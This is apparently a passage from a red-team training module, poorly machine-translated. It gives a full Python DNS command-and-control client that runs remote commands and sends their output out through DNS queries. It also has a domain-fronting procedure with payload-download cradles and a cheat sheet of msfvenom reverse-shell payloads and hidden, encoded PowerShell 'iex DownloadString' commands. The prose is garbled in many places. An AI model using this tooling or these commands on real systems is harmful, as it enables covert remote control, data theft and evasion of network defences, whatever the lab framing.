Placeholder: LHOST=--server（DNS Servers/attackers IP）, LPORT=--port（Default 53）, DOMAIN=--domain（Channel Field Postfix）, 
        --session=8 bit hex Session ID（Create and print randomly without filling）

Agreement (with m09-dns-c2-server.py Strictly matching.）: 
    Heart beat command: Query A   h.<session>.<domain>
                → The service is waiting for the order to be issued. 4 Byte group inserted A Records rdata（Every heart beats the most. 40 Bytes），
                  Command by b"\\n" end; client accumulates to b"\\n" That's why I thought I'd take all the orders.。
    Back Transfer Out: Query A   o.<session>.<hexBlocks0>.<hexBlocks1>...<domain>
                → The service side splits. hex After the label is spelled unhexlify，Append writing outdir/<session>.out

Test status: Used python3 -m py_compile Adopted; relevant m09-dns-c2-server.py Yes. 127.0.0.1 I've been through a straight circuit test.
          （The service receives heartbeats, orders, back transmissions. Real Field NS Deployment patterns need to be validated in the experimental environment。

Known problems (service end, client unchanged)）: m09-dns-c2-server.py Yes. build_reply() Lee.
    struct.pack(">HHHHH", tid, flags, 1, len(rdatas), 0, 0)
  Here. 5 individual H Yes. 6 It's a value. The service responds every time. struct.error Collapse; to be replaced by maintainer ">HHHHHH"。
  Before the service end is repaired, the client has a normal heartbeat, but no orders.。
"""
import argparse
import binascii
import os
import random
import socket
import struct
import subprocess
import sys
import time

CMD_END = b"\n"        # Align with service: Command to end tagging
HEX_LABEL = 60         # Each DNS Label 60 individual hex Character（<63，And even numbers allow bytes）
MAX_QNAME = 253        # DNS Maximum length of name
MAX_OUTPUT = 4096      # Byte limit for the return of a single order (overcut to avoid overlong queries being discarded)）
DEFAULT_TIMEOUT = 60   # Single command local timeout (sec)）

def encode_name(name):
    """Put a.b.c Encoding DNS Line format (each paragraph) <=63）。"""
    out = b""
    for label in name.split("."):
        raw = label.encode("ascii")
        if len(raw) > 63:
            raise ValueError("label too long: " + label)
        out += bytes([len(raw)]) + raw
    return out + b"\x00"

def read_name(data, off):
    """Parsing DNS Name (Support) 0xC0 Compressed pointer) (Name, End Offset)。"""
    labels = []
    end = None
    jumped = False
    while True:
        if off >= len(data):
            raise ValueError("truncated name")
        ln = data[off]
        if ln == 0:
            off += 1
            if end is None:
                end = off
            break
        if ln & 0xC0 == 0xC0:
            ptr = struct.unpack(">H", data[off:off + 2])[0] & 0x3FFF
            if end is None:
                end = off + 2
            off = ptr
            jumped = True
            continue
        labels.append(data[off + 1:off + 1 + ln].decode("ascii", "ignore"))
        off += 1 + ln
    if jumped and end is None:
        end = off
    return ".".join(labels), end

def build_query(qname, qtype=1):
    """Construct Standard DNS Query Messages（qtype Default A）。"""
    tid = random.randint(0, 0xFFFF)
    header = struct.pack(">HHHHHH", tid, 0x0100, 1, 0, 0, 0)
    return tid, header + encode_name(qname) + struct.pack(">HH", qtype, 1)

def parse_a_records(data, want_tid):
    """Parsing Response, Return A Record 4 Bytes rdata List；tid Return empty list when matching or abnormal。"""
    if len(data) < 12:
        return []
    tid, _flags, qd, an, _ns, _ar = struct.unpack(">HHHHHH", data[:12])
    if tid != want_tid:
        return []
    off = 12
    try:
        for _ in range(qd):
            _name, off = read_name(data, off)
            off += 4                      # qtype + qclass
        out = []
        for _ in range(an):
            _name, off = read_name(data, off)
            if off + 10 > len(data):
                break
            rtype, _rclass, _ttl, rdlen = struct.unpack(">HHIH", data[off:off + 10])
            off += 10
            rdata = data[off:off + rdlen]
            off += rdlen
            if rtype == 1 and rdlen == 4:
                out.append(rdata)
        return out
    except (ValueError, struct.error):
        return []

def dns_query(server, port, qname, timeout=3.0, retries=2):
    """Once. A Query, return A Records rdata List (failure/timeback empty list)）。"""
    for _ in range(retries + 1):
        try:
            tid, packet = build_query(qname)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(timeout)
            try:
                s.sendto(packet, (server, port))
                data, _addr = s.recvfrom(4096)
            finally:
                s.close()
            records = parse_a_records(data, tid)
            if records is not None:
                return records
        except (socket.timeout, OSError):
            time.sleep(0.2)
    return []

def fetch_command(server, port, session, domain, timeout):
    """Heart rate.: h.<session>.<domain>，Return command bytes received (possibly part of an order)）。"""
    qname = "h.%s.%s" % (session, domain)
    if len(qname) > MAX_QNAME:
        print("[-] qname Too long.: %s" % qname, flush=True)
        return b""
    chunks = dns_query(server, port, qname, timeout)
    return b"".join(chunks).rstrip(b"\x00")

def send_output(server, port, session, domain, data, timeout, max_output=MAX_OUTPUT):
    """Back Transfer Out: o.<session>.<hex...>.<domain>，Automatically split into multiple queries by length。"""
    if not data:
        data = b"(none)"
    data = data[:max_output]
    hexs = binascii.hexlify(data).decode("ascii")
    labels = [hexs[i:i + HEX_LABEL] for i in range(0, len(hexs), HEX_LABEL)]
    if not labels:
        labels = ["00"]

    prefix = "o." + session + "."
    suffix = "." + domain
    cap = MAX_QNAME - len(prefix) - len(suffix)
    if cap <= 0:
        print("[-] It's too long to return.", flush=True)
        return

    batch, batch_len = [], 0
    sent = 0
    for label in labels:
        cost = len(label) + 1
        if batch and batch_len + cost > cap:
            dns_query(server, port, prefix + ".".join(batch) + suffix, timeout, retries=1)
            sent += 1
            batch, batch_len = [], 0
        batch.append(label)
        batch_len += cost
    if batch:
        dns_query(server, port, prefix + ".".join(batch) + suffix, timeout, retries=1)
        sent += 1
    print("[>] Back %d Bytes（%d Minor queries）" % (len(data), sent), flush=True)

def run_command(cmd_bytes, timeout):
    """Local execution command, return stdout+stderr Bytes。"""
    try:
        cmd = cmd_bytes.decode("utf-8", "replace").strip()
    except AttributeError:
        cmd = str(cmd_bytes).strip()
    if not cmd:
        return b"(empty command)"
    print("[+] Implementation: %s" % cmd, flush=True)
    try:
        if os.name == "nt":
            p = subprocess.Popen(cmd, shell=True,
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        else:
            p = subprocess.Popen(["/bin/sh", "-c", cmd],
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        try:
            out, err = p.communicate(timeout=timeout)
        except subprocess.TimeoutExpired:
            p.kill()
            out, err = p.communicate()
            return (out or b"") + (err or b"") + b"\n[!] timeout"
        result = (out or b"") + (err or b"")
        return result if result else b"(no output)"
    except OSError as e:
        return ("exec error: %s" % e).encode()

def main():
    ap = argparse.ArgumentParser(
        description="Very simple DNS C2 Client (scenario) 32，and m09-dns-c2-server.py Complement）")
    ap.add_argument("--server", required=True, help="DNS Chile（LHOST）")
    ap.add_argument("--port", type=int, default=53, help="DNS Server port (default) 53）")
    ap.add_argument("--domain", required=True, help="Channel domain suffix, e.g. c2.example")
    ap.add_argument("--session", default="", help="Session ID（8 bit hex）；Random generation without filling")
    ap.add_argument("--interval", type=float, default=2.0, help="Heart beat interval seconds (default) 2）")
    ap.add_argument("--dns-timeout", type=float, default=3.0, help="Single DNS Timeout")
    ap.add_argument("--cmd-timeout", type=int, default=DEFAULT_TIMEOUT, help="Single command execution timeout")
    ap.add_argument("--max-output", type=int, default=MAX_OUTPUT, help="Single command returns byte limit")
    ap.add_argument("--count", type=int, default=0, help="Maximum number of heartbeats，0=Open-ended (for one-time testing)）")
    args = ap.parse_args()

    session = args.session.strip().lower()
    if not session:
        session = "%08x" % random.getrandbits(32)
    if len(session) > 16 or any(c not in "0123456789abcdef" for c in session):
        print("[-] --session Must be. <=16 Bit hex", file=sys.stderr)
        return 2

    print("[*] DNS C2 Client Startup", flush=True)
    print("[*] server=%s:%d domain=%s session=%s interval=%.1fs"
          % (args.server, args.port, args.domain, session, args.interval), flush=True)
    print("[*] Exit: Ctrl+C", flush=True)

    buf = b""
    beats = 0
    try:
        while True:
            if args.count and beats >= args.count:
                break
            beats += 1
            chunk = fetch_command(args.server, args.port, session,
                                  args.domain, args.dns_timeout)
            if chunk:
                buf += chunk
                while CMD_END in buf:
                    cmd, buf = buf.split(CMD_END, 1)
                    output = run_command(cmd, args.cmd_timeout)
                    send_output(args.server, args.port, session, args.domain,
                                output, args.dns_timeout, args.max_output)
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print("\n[*] Copy, abort.", flush=True)
    return 0

if __name__ == "__main__":
    sys.exit(main())

# ============================================================
# Elements of transplant (no target) Python Time）
#   PowerShell: Resolve-DnsName -Name "h.<session>.<domain>" -Type A -Server LHOST
#     → Take every one of the answers. A Record IPAddress，Put 4 Byte unturned to command byte by decimal；
#     Callback Resolve-DnsName -Name "o.<session>.<hex>.<domain>" -Type A -Server LHOST It's all right.）。
#   dnscat2: Service dnscat2-server --domain c2.example，Client dnscat2 Binary, fit to really interact. shell Time。
#   UDP 53 Stopped but TCP 53 General: This script only covers UDP，Support required TCP Tunnel tool。
# ============================================================
````

**Verify**: The server console receives a heartbeat (`[+] session ... ' ) and prints the command output; `tcpdump-i eth0 udp port 53 ' can see regular `x.&lt;session&gt;.c2.example ' queries.

**If it fails / alternatives**:
- The DNS only resolves the internal network/is forced into the Intranet DNS can `c2.example ' be forwarded to your authoritative server? It's not going to work.
- There is no Python interpreter for the target. Use the compiled dnscat2 client, or port the client logic to PowerShell (with `Resolve-DnsName ' ), with script header notes giving the main points of the transplant.
- Tunnels are sealed (request frequency/long label detection) down by `-interval ' , shorter package loads, fewer commands.
- UDP 53 stopped but TCP 53 passed a tunnel tool (dnscat2 support) that needs to be supported by TCP, and a self-written script only covers UDP.

**Specific Attention OPSEC**: Long hex sub-area + high frequency heart beats are powerful detection features only when permitted by the experimental rule (the scenario states that "the course experiment allows"); command output is too big; DNS server starts before 53 to confirm that the port is empty and will not be blocked by the target export strategy.

---

## Scenario 33: Target restricts destination domains; lab infra supports domain fronting

**Situation**: Targets only allow access to specific front-end addresses, with no direct access to back-end; pilot infrastructure supports "front-end separation" (teach material § 14.6).

**Preconditions and assumptions**: one objective ** allows access to **front-end address (FRONT domain/IP); there is a facility that can route requests to the back end by HTTP Post - real CDN (e.g. Azur Front Door) or self-built nginx reverse agent simulation; backend = your C2-delivered server.** Key to the establishment of the front field**: The export inspection saw TLS SNI/Date Address = FRONT, while HTTP Host Head = Backend Route.

**Prepare (attacker)**: Self-Construction Laboratory Frontend nginx (443 + FRONT certificate)+ backend listening:

```bash
# nginx frontend configuration see m09-domain-fronting-nginx.conf
# Backend C2/ delivery listening
bash m09-https-listener.sh --mode ssl-test --cert cert.pem --key key.pem --port 8443
# or msf: use expluit/multi/handler; set PAYLOAD Windows/x64/meterpreter/reverse https; run
```

**Procedure**:
1. The target side was identified as FRONT: 443 through (`Test-NetConnect FRONT-Port 443 ' ) and no direct connection to the back end.
Client access template - FRONT, HTTP header backend
```bash
# Targetside Curl
curl -k https://FRONT/ -H "Host: BACKEND" --resolve FRONT:443:FRONT_IP -o PAYLOAD
```
```powershell
# Or PowerShell Downloader/ Backlink, Host Head to Backend
# $c = New-Object Net.WebClient; $c.Headers.Add("Host","BACKEND"); $c.DownloadString("https://FRONT/PAYLOAD")
```
3. nginx front end press Host route: Host=FRONT → Normal page (cover); Host=BACKEND→ 'proxy pass ' to backend listening. Only FRONT (sNI/certificate/purpose domain names match release rules) is seen at the exit.
Validation: The backend listens to requests received from the target (the source will be the front-end IP or target IP, depending on the agent ' s location); download/meeting success.
Real CDN version: Register BACKEND as a CDN backend source, the one where the front end domain name is released with the target; do a non-hazardous GET validation route before payload.

**Lab files**:
| File | Purpose | Key args |
|---|---|---|
|m09-domain-fronting-nginx.conf | Replacing FRONT / BACKEND/ Certificate Path |
`m09-https-lister.sh ' | backend HTTPS listening/delivered |-port 8443 ' |
|m09-proxy-aware-downloader.ps1 | (available host head) |-Url https://FRONT/PAYLOAD-Hosthead BACKEND '|

**Verify**: Backend listening/nginx log appearance of target request and Host = BACKEND; No harm GET before real payload; FRONT only confirmed on the exit side (if there is a catch).

**If it fails / alternatives**:
- The front end press SNI instead of the Host route / check that the SNI corresponds to the Host field is not available for re-entry 28 (agent) or 32 (DNS).
- CDN does not forward custom Host (many CDNs will 502 reject) → The experimental infrastructure is not supported, is replaced by a self-built front end, or is abandoned.
- Targets only release FRONT and FRONT is not the domain name that you can control the certificate.

**OPSEC**: scene 33 is ** infrastructure dependencies** (the original scenario is clearly "dependent on specific service support") - – Do not go on the payload for the first time in the test with a harmless GET test before the exam; Domain foreground requires a separation of Host and SNI, and do not spell the mechanism in the report.

---

## Module cheat sheet

```bash
# Embedded payload
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f ps1

# Coding PowerShell command (scenes 17/28/31;
echo -en 'iex((New-Object Net.WebClient).DownloadString("http://LHOST/PAYLOAD"))' | iconv -t UTF-16LE | base64 -w 0
powershell -nop -w hidden -enc &lt;BASE64&gt;

# Proxy View / Setup (Scene 28/29)
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer
netsh winhttp show proxy && netsh winhttp set proxy proxy-server=http://proxy:8080 && netsh winhttp reset proxy

# proxy sensor download (scenario 28/29/31)
powershell -ep bypass -f m09-proxy-aware-downloader.ps1 -Url http://LHOST/PAYLOAD -Command -DefaultCreds

# DNS Channel
sudo python3 m09-dns-c2-server.py --domain c2.example
python3 m09-dns-c2-client.py --server LHOST --session a1b2c3d4

# Field pre-access template (scenes 33)
curl -k https://FRONT/ -H "Host: BACKEND" --resolve FRONT:443:FRONT_IP -o PAYLOAD

# HTTPS listening (scenario 30/31/33)
bash m09-https-listener.sh --mode msf --cert cert.pem --key key.pem
```

## Related lab files

| File | Scenarios |
|---|---|
| `m09-proxy-aware-downloader.ps1` | 28, 29, 30, 31 |
| `m09-dns-c2-server.py` | 32 |
| `m09-dns-c2-client.py` | 32 |
| `m09-domain-fronting-nginx.conf` | 33, 31 |
| `m09-https-listener.sh` | 30, 31, 33 |

Cross-module references: `m00-delivery-server.py ' (17/28/30 delivery and log), `m01-shellcode-runner-vba-archbranch.vba ' (17 embedded), `m03-dotnettojscript-loader.js ' (17 bridging), [08-pivoting-tunneling] (/modules/08-pivoting-tunneling) (29/30 tunnel options).
